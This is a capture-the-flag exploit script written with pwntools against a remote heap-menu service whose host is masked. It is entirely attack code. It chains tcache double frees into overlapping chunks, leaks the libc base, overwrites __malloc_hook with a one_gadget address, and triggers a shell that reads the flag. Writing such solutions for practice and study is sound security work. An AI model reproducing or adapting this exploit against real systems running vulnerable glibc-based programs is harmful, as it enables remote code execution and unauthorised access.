from pwn import *

io=remote('xx.xx.xx.xx',xxxx)
libc=ELF('./libc.so.6')

def add(idx,size,data):
    io.recvuntil('choice > ')
    io.sendline('1')
    io.recvuntil('the index')
    io.sendline(str(idx))
    io.recvuntil('the size')
    io.sendline(str(size))
    io.recvuntil('something')
    io.sendline(data)
    io.recvuntil('gift :')
    return int(io.recvline()[2:],16)

def free(idx):
    io.recvuntil('choice > ')
    io.sendline('2')
    io.recvuntil('the index')
    io.sendline(str(idx))   

heap=add(0,0x78,'a')#0
print(hex(heap))
add(1,0x18,'b')#1
add(2,0x78,'c')#2
add(3,0x78,'d')#3 
add(4,0x78,'c')#4
add(5,0x78,'d')#5 
add(6,0x78,'c')#6
add(7,0x78,'d')#7 
add(8,0x78,'c')#8
add(9,0x78,'d')#9 
add(10,0x78,'c')#10
add(11,0x78,'d')#11
add(12,0x28,'d')#12
#dup
free(12)
free(12)
add(13,0x28,p64(heap-0x10))#4
add(14,0x28,p64(heap-0x10))#5
add(15,0x28,p64(0)+p64(0x421))#get chunk0->size

#overlap
free(0) #unsort_bin chunk0->fd=libc
free(1) #tcache
add(16,0x78,'e')#7  chunk1->fd=libc
add(17,0x18,'f')#8  get chunk1
libc_base=add(18,0x18,'g')-0x3ebca0#9   get libc
malloc_hook=libc_base+libc.sym['__malloc_hook']
one_gadget=libc_base+0x10a38c
print(hex(libc_base),hex(malloc_hook))

#dup
free(5)
free(5)
add(19,0x78,p64(malloc_hook))
add(20,0x78,p64(malloc_hook))
add(21,0x78,p64(one_gadget))
#getshell
io.sendline('1')
io.sendline('22')
io.sendline('0;cat flag')

io.interactive()